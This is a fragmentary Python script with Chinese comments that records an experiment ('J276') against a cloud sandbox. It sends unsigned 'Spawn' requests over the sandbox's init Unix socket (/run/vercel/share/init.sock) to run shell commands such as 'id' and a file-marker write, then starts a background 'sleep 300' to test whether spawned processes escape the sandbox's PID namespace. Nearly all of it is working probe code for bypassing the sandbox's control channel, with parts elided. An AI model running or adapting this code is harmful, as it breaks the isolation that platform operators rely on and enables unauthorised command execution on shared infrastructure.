# -*- coding: utf-8 -*-
"""实验J276: 免签 Spawn 字段名修正 (arguments/environment)
A: patch
B: Spawn /bin/sh -c "id; touch marker" -> 响应流 + marker 检查
D: Spawn sleep 300 & -> 沙箱内 ps 是否可见 (PID namespace 判断)
"""
...
def spawn_req(command, arguments, outfile, timeout=20):
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect("/run/vercel/share/init.sock")
        import json as _j
        msg = _j.dumps({"command": command, "arguments": arguments,
                        "environment": []}).encode()
...
def bg(cmd, args, outf, log):
    ...
    return r.pid
pid = bg("/bin/sh", "-c\x1fid; pwd; echo SPWN_MARK > /tmp/spawn_marker.txt", "/tmp/r3.txt", "/tmp/bg3.log")
...
if os.path.exists("/tmp/r3.txt"):
    ...
    print("r3:", "".join(chr(b) if 32 <= b < 127 else "." for b in d)[:1500], flush=True)
print("spawn_marker:", os.path.exists("/tmp/spawn_marker.txt"), flush=True)
if os.path.exists("/tmp/spawn_marker.txt"):
    print("marker:", open("/tmp/spawn_marker.txt").read()[:300], flush=True)
'''
    run_cmd(sid, CODE_C, "C_CHECK3", timeout=100)

    # D: Spawn sleep 300 & 观察进程可见性
    CODE_D = r'''
import subprocess
def bg(cmd, args, outf, log):
    r = subprocess.Popen(
    ...
    return r.pid
pid = bg("/bin/sh", "-c\x1fsleep 300", "/tmp/r4.txt", "/tmp/bg4.log")
...
print("r4 exists:", os.path.exists("/tmp/r4.txt"), flush=True)
if os.path.exists("/tmp/r4.txt"):
    d = open("/tmp/r4.txt", "rb").read()
    print("r4:", "".join(chr(b) if 32 <= b < 127 else "." for b in d)[:800], flush=True)
